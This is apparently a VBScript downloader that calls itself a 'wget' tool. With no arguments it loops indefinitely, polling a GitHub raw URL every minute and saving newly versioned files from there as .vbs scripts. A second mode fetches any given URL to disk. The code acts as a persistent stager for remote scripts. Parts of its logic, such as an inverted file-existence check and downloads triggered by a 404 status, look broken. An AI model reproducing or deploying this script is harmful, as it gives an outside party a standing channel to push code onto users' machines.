Dim wGetArgs, WshShell, strCurDir, xHttp, bStrm, appVersion, appUrl, addVersion
	Set wGetArgs = WScript.Arguments
	Set WshShell = CreateObject("WScript.Shell")
	strCurDir    = WshShell.CurrentDirectory
	addVersion = 4 'change Version change file name too 
	appVersion =  "wget_v1." & addVersion
	appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
	
	function FileExists(FilePath)
		Set fso = CreateObject("Scripting.FileSystemObject")
		If Not fso.FileExists(FilePath) Then
			FileExists=CBool(1)
		Else
			FileExists=CBool(0)
		end If
	end function

	function checkUrl(url)
			Set o = CreateObject("MSXML2.XMLHTTP")
			on error resume next
			o.open "GET", url, False
			o.send
			if o.Status = 404 then checkUrl = o.Status
			on error goto 0 
	end function
	
	if WScript.Arguments.Count = 0 then
		Do while True:
		
			if checkUrl(appUrl) = 404 then
				addVersion = addVersion + 1
				appVersion =  "wget_v1." & addVersion
				appUrl = "https://raw.githubusercontent.com/Parrot-cyber/contact/main/" & appVersion
				Set xHttp = createobject("Microsoft.XMLHTTP")
				Set bStrm = createobject("Adodb.Stream")
				xHttp.Open "GET", appUrl, False
				xHttp.Send
				with bStrm
					.type = 1 '//binary
					.open
					.write xHttp.responseBody
					.savetofile strCurDir & "\" & appVersion & ".vbs", 2 '//overwrite
				end with
			elseif FileExists(strCurDir & "\" & appVersion & ".vbs") Then
				Set xHttp = createobject("Microsoft.XMLHTTP")
				Set bStrm = createobject("Adodb.Stream")
				xHttp.Open "GET", appUrl, False
				xHttp.Send
				with bStrm
					.type = 1 '//binary
					.open
					.write xHttp.responseBody
					.savetofile strCurDir & "\" & appVersion & ".vbs", 2 '//overwrite
				end with
			end if
			WScript.Sleep(60000)
		loop
	elseif WScript.Arguments.Count = 3 then
		srcAddress = wGetArgs(1)
		dstName = wGetArgs(2)
		Set xHttp = createobject("Microsoft.XMLHTTP")
		Set bStrm = createobject("Adodb.Stream")
		xHttp.Open "GET", srcAddress, False
		xHttp.Send
		with bStrm
			.type = 1 '//binary
			.open
			.write xHttp.responseBody
			.savetofile strCurDir & "\" & dstName, 2 '//overwrite
		end with
	end if
